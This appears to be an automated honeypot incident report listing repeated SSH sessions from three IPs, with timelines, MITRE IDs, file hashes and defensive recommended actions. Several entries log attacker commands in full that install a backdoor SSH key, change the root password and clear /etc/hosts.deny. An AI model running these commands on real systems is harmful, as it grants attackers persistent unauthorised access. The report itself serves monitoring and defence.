| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:30:50` | `cowrie.session.connect` |
| `2026-04-16 19:30:50` | `cowrie.client.version` |
| `2026-04-16 19:30:50` | `cowrie.client.kex` |
| `2026-04-16 19:30:51` | `cowrie.login.success` |
| `2026-04-16 19:30:51` | `cowrie.session.params` |
| `2026-04-16 19:30:51` | `cowrie.command.input` |
| `2026-04-16 19:30:51` | `cowrie.command.failed` |
| `2026-04-16 19:30:51` | `cowrie.log.closed` |
| `2026-04-16 19:30:51` | `cowrie.session.params` |
| `2026-04-16 19:30:51` | `cowrie.command.input` |
| `2026-04-16 19:30:52` | `cowrie.session.file_download` |
| `2026-04-16 19:30:52` | `cowrie.log.closed` |
| `2026-04-16 19:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef18da7977e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:30 |
| **Last Seen** | 2026-04-16 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:30:53` | `cowrie.session.connect` |
| `2026-04-16 19:30:53` | `cowrie.client.version` |
| `2026-04-16 19:30:53` | `cowrie.client.kex` |
| `2026-04-16 19:30:54` | `cowrie.login.success` |
| `2026-04-16 19:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d855d3ae4e7d

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:31 |
| **Last Seen** | 2026-04-16 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:31:18` | `cowrie.session.connect` |
| `2026-04-16 19:31:18` | `cowrie.client.version` |
| `2026-04-16 19:31:18` | `cowrie.client.kex` |
| `2026-04-16 19:31:19` | `cowrie.login.success` |
| `2026-04-16 19:31:19` | `cowrie.session.params` |
| `2026-04-16 19:31:19` | `cowrie.command.input` |
| `2026-04-16 19:31:19` | `cowrie.command.failed` |
| `2026-04-16 19:31:19` | `cowrie.log.closed` |
| `2026-04-16 19:31:20` | `cowrie.session.params` |
| `2026-04-16 19:31:20` | `cowrie.command.input` |
| `2026-04-16 19:31:20` | `cowrie.session.file_download` |
| `2026-04-16 19:31:20` | `cowrie.log.closed` |
| `2026-04-16 19:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a40ba1caf95

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:31 |
| **Last Seen** | 2026-04-16 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:31:21` | `cowrie.session.connect` |
| `2026-04-16 19:31:21` | `cowrie.client.version` |
| `2026-04-16 19:31:22` | `cowrie.client.kex` |
| `2026-04-16 19:31:22` | `cowrie.login.success` |
| `2026-04-16 19:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dddae835294

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-04-16 19:33 |
| **Last Seen** | 2026-04-16 19:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:33:28` | `cowrie.session.connect` |
| `2026-04-16 19:33:28` | `cowrie.client.version` |
| `2026-04-16 19:33:28` | `cowrie.client.kex` |
| `2026-04-16 19:33:29` | `cowrie.login.success` |
| `2026-04-16 19:33:30` | `cowrie.session.params` |
| `2026-04-16 19:33:30` | `cowrie.command.input` |
| `2026-04-16 19:33:30` | `cowrie.command.failed` |
| `2026-04-16 19:33:31` | `cowrie.log.closed` |
| `2026-04-16 19:33:31` | `cowrie.session.params` |
| `2026-04-16 19:33:31` | `cowrie.command.input` |
| `2026-04-16 19:33:32` | `cowrie.session.file_download` |
| `2026-04-16 19:33:32` | `cowrie.log.closed` |
| `2026-04-16 19:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812986a7e40e

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-04-16 19:33 |
| **Last Seen** | 2026-04-16 19:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:33:35` | `cowrie.session.connect` |
| `2026-04-16 19:33:35` | `cowrie.client.version` |
| `2026-04-16 19:33:36` | `cowrie.client.kex` |
| `2026-04-16 19:33:37` | `cowrie.login.success` |
| `2026-04-16 19:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0a50420313

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:34 |
| **Last Seen** | 2026-04-16 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:34:13` | `cowrie.session.connect` |
| `2026-04-16 19:34:13` | `cowrie.client.version` |
| `2026-04-16 19:34:14` | `cowrie.client.kex` |
| `2026-04-16 19:34:14` | `cowrie.login.success` |
| `2026-04-16 19:34:14` | `cowrie.session.params` |
| `2026-04-16 19:34:14` | `cowrie.command.input` |
| `2026-04-16 19:34:14` | `cowrie.command.failed` |
| `2026-04-16 19:34:14` | `cowrie.log.closed` |
| `2026-04-16 19:34:15` | `cowrie.session.params` |
| `2026-04-16 19:34:15` | `cowrie.command.input` |
| `2026-04-16 19:34:15` | `cowrie.session.file_download` |
| `2026-04-16 19:34:15` | `cowrie.log.closed` |
| `2026-04-16 19:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70041ffc92b5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:34 |
| **Last Seen** | 2026-04-16 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:34:17` | `cowrie.session.connect` |
| `2026-04-16 19:34:17` | `cowrie.client.version` |
| `2026-04-16 19:34:17` | `cowrie.client.kex` |
| `2026-04-16 19:34:17` | `cowrie.login.success` |
| `2026-04-16 19:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a065b314e2d

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:34 |
| **Last Seen** | 2026-04-16 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:34:19` | `cowrie.session.connect` |
| `2026-04-16 19:34:19` | `cowrie.client.version` |
| `2026-04-16 19:34:19` | `cowrie.client.kex` |
| `2026-04-16 19:34:19` | `cowrie.login.success` |
| `2026-04-16 19:34:20` | `cowrie.session.params` |
| `2026-04-16 19:34:20` | `cowrie.command.input` |
| `2026-04-16 19:34:20` | `cowrie.command.failed` |
| `2026-04-16 19:34:20` | `cowrie.log.closed` |
| `2026-04-16 19:34:20` | `cowrie.session.params` |
| `2026-04-16 19:34:20` | `cowrie.command.input` |
| `2026-04-16 19:34:20` | `cowrie.session.file_download` |
| `2026-04-16 19:34:20` | `cowrie.log.closed` |
| `2026-04-16 19:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56924eb26979

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:34 |
| **Last Seen** | 2026-04-16 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:34:22` | `cowrie.session.connect` |
| `2026-04-16 19:34:22` | `cowrie.client.version` |
| `2026-04-16 19:34:22` | `cowrie.client.kex` |
| `2026-04-16 19:34:23` | `cowrie.login.success` |
| `2026-04-16 19:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f601da1073f

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:37 |
| **Last Seen** | 2026-04-16 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:37:23` | `cowrie.session.connect` |
| `2026-04-16 19:37:23` | `cowrie.client.version` |
| `2026-04-16 19:37:23` | `cowrie.client.kex` |
| `2026-04-16 19:37:23` | `cowrie.login.success` |
| `2026-04-16 19:37:24` | `cowrie.session.params` |
| `2026-04-16 19:37:24` | `cowrie.command.input` |
| `2026-04-16 19:37:24` | `cowrie.command.failed` |
| `2026-04-16 19:37:24` | `cowrie.log.closed` |
| `2026-04-16 19:37:24` | `cowrie.session.params` |
| `2026-04-16 19:37:24` | `cowrie.command.input` |
| `2026-04-16 19:37:24` | `cowrie.session.file_download` |
| `2026-04-16 19:37:24` | `cowrie.log.closed` |
| `2026-04-16 19:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4128cd62ff0f

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:37 |
| **Last Seen** | 2026-04-16 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:37:26` | `cowrie.session.connect` |
| `2026-04-16 19:37:26` | `cowrie.client.version` |
| `2026-04-16 19:37:26` | `cowrie.client.kex` |
| `2026-04-16 19:37:26` | `cowrie.login.success` |
| `2026-04-16 19:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595d757ca3a4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:37 |
| **Last Seen** | 2026-04-16 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:37:29` | `cowrie.session.connect` |
| `2026-04-16 19:37:29` | `cowrie.client.version` |
| `2026-04-16 19:37:29` | `cowrie.client.kex` |
| `2026-04-16 19:37:30` | `cowrie.login.success` |
| `2026-04-16 19:37:30` | `cowrie.session.params` |
| `2026-04-16 19:37:30` | `cowrie.command.input` |
| `2026-04-16 19:37:30` | `cowrie.command.failed` |
| `2026-04-16 19:37:30` | `cowrie.log.closed` |
| `2026-04-16 19:37:30` | `cowrie.session.params` |
| `2026-04-16 19:37:30` | `cowrie.command.input` |
| `2026-04-16 19:37:31` | `cowrie.session.file_download` |
| `2026-04-16 19:37:31` | `cowrie.log.closed` |
| `2026-04-16 19:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083d9ba65177

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:37 |
| **Last Seen** | 2026-04-16 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:37:32` | `cowrie.session.connect` |
| `2026-04-16 19:37:32` | `cowrie.client.version` |
| `2026-04-16 19:37:33` | `cowrie.client.kex` |
| `2026-04-16 19:37:33` | `cowrie.login.success` |
| `2026-04-16 19:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76c200cddbf

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-04-16 19:38 |
| **Last Seen** | 2026-04-16 19:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:38:53` | `cowrie.session.connect` |
| `2026-04-16 19:38:53` | `cowrie.client.version` |
| `2026-04-16 19:38:54` | `cowrie.client.kex` |
| `2026-04-16 19:38:55` | `cowrie.login.success` |
| `2026-04-16 19:38:56` | `cowrie.session.params` |
| `2026-04-16 19:38:56` | `cowrie.command.input` |
| `2026-04-16 19:38:56` | `cowrie.command.failed` |
| `2026-04-16 19:38:56` | `cowrie.log.closed` |
| `2026-04-16 19:38:57` | `cowrie.session.params` |
| `2026-04-16 19:38:57` | `cowrie.command.input` |
| `2026-04-16 19:38:57` | `cowrie.session.file_download` |
| `2026-04-16 19:38:57` | `cowrie.log.closed` |
| `2026-04-16 19:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb580e7b4b25

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-04-16 19:39 |
| **Last Seen** | 2026-04-16 19:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:39:01` | `cowrie.session.connect` |
| `2026-04-16 19:39:01` | `cowrie.client.version` |
| `2026-04-16 19:39:01` | `cowrie.client.kex` |
| `2026-04-16 19:39:03` | `cowrie.login.success` |
| `2026-04-16 19:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bcbeb96b321

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-04-16 19:40 |
| **Last Seen** | 2026-04-16 19:41 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZAlhoYZxGSNG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
